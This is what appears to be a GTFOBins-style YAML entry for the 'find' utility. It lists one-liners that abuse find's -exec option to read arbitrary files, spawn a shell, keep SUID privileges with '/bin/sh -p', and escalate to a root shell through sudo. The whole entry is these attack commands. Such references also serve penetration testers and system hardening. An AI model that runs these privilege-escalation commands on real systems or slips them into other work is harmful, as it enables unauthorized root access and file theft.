---
functions:
  file-read:
    - code: find file_to_read -exec cat {} \; -quit
  shell:
    - code: find . -exec /bin/sh \; -quit
  suid:
    - code: ./find . -exec /bin/sh -p \; -quit
  sudo:
    - code: sudo find . -exec /bin/sh \; -quit
---
